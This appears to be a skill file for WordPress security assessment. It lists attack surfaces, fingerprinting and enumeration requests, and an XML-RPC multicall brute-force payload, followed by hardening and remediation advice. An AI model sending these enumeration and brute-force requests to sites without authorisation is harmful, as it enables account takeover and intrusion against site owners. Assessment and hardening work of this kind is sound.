---
name: wordpress
description: WordPress-specific security assessment techniques
---

# WordPress Security

## Attack Surface

- Core version vulnerabilities (check via `/readme.html`, meta generator tag)
- Plugin and theme vulnerabilities (largest attack vector)
- `xmlrpc.php` - brute force amplification, SSRF, DoS via pingback
- `wp-login.php` - credential brute force
- REST API user enumeration (`/wp-json/wp/v2/users`)
- File upload via media library and plugin editors
- `wp-config.php` exposure through backup files or misconfiguration
- Debug mode leaking sensitive information (`WP_DEBUG = true`)

## Detection Techniques

- Fingerprint version: `GET /readme.html`, `GET /?feed=rss2` (generator tag)
- Enumerate plugins: probe `/wp-content/plugins/{name}/readme.txt`
- Enumerate users: `GET /?author=1`, `GET /wp-json/wp/v2/users`
- Check XML-RPC: `POST /xmlrpc.php` with `system.listMethods`
- Test directory listing: `/wp-content/uploads/`, `/wp-includes/`
- Scan for backup files: `wp-config.php.bak`, `wp-config.old`, `.wp-config.php.swp`
- Check WP-Cron status: `GET /wp-cron.php`

## Common Payloads

### User Enumeration
```
GET /?author=1
GET /?author=2
GET /wp-json/wp/v2/users
GET /wp-json/wp/v2/users?per_page=100
```

### XML-RPC Brute Force
```xml
POST /xmlrpc.php
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
      <member><name>params</name><value><array><data>
        <value>admin</value><value>password1</value>
      </data></array></value></member>
    </struct></value>
  </data></array></value></param></params>
</methodCall>
```

### Plugin Probing
```
GET /wp-content/plugins/akismet/readme.txt
GET /wp-content/plugins/contact-form-7/readme.txt
GET /wp-content/plugins/woocommerce/readme.txt
```

## Remediation

- Keep WordPress core, themes, and plugins updated; remove unused plugins
- Disable XML-RPC if not needed: block at web server or use plugin
- Restrict `/wp-admin/` and `wp-login.php` access by IP or 2FA
- Disable user enumeration via REST API (filter `rest_endpoints`)
- Set `define('DISALLOW_FILE_EDIT', true)` in `wp-config.php`
- Move `wp-config.php` above web root or restrict access via server config
- Implement rate limiting on login endpoints
- Set `WP_DEBUG` to `false` in production

## References

- [WPScan Vulnerability Database](https://wpscan.com/wordpresses)
- [OWASP WordPress Security Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [WordPress Hardening Guide](https://developer.wordpress.org/advanced-administration/security/hardening/)
